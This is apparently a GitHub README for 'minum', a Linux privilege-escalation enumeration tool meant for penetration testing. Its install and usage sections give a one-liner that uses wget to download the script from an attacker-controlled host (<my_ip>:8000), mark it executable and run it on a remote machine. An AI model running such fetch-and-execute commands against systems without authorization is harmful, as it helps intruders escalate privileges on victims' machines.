# minum : Minimal Enumeration Tool

This enumeration for privilege escalation tool, unlike many others, is built towards the idea of finding the top most relevant privilege escalation vectors for its user.  
The idea is to prevent throwing a lot of things at the user and let him begin searching for a needle in a haystack.  
Instead, it will ask you for your preferable routes throughout its running and will present to the user only the interesting stuff.
Letting you spend more time on exploiting and less time on reading tons of text all over the place.  
At the end it will also load for you linpeas.sh automatically in case you want an indepth lookout.  

Have fun, and use my tool for good purposes! Educational purposes ONLY !!

P.S

Have some suggestions? Leave an issue and we will be able to look at it and make modifications.

Cheers!

## Install
On your local machine:
```
git clone https://github.com/nirzaaa/minum.git
cd minum
python -m http.server
```

On the remote machine:
```
`wget <my_ip>:8000/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`
```

## Usage

You can download the script to the remote machine and run it for you automatically by using:  
`wget <my_ip>:8000/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`
